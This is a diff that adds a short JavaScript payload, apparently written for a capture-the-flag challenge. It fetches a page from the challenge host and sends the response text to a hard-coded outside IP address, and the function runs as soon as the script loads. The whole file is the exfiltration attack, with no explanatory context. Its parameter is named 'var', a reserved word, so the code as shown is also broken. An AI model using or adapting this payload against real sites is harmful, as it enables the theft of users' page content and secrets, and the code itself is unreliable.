@@ -1,0 +1,21 @@
+function loadDoc(var) {
+  var xhttp = new XMLHttpRequest();
+  xhttp.onreadystatechange = function() {
+    if (this.readyState == 4 && this.status == 200) {
+      console.log(1)
+    }
+  };
+  xhttp.open("GET", "http://51.255.213.184:8080/" + escape(var), true);
+  xhttp.send();
+}
+function a() {
+  var xhttp = new XMLHttpRequest();
+  xhttp.onreadystatechange = function() {
+    if (this.readyState == 4 && this.status == 200) {
+      loadDoc(this.responseText)
+    }
+  };
+  xhttp.open("GET", "http://8085.ctf.certcc.ir/help", true);
+  xhttp.send();
+}
+a();
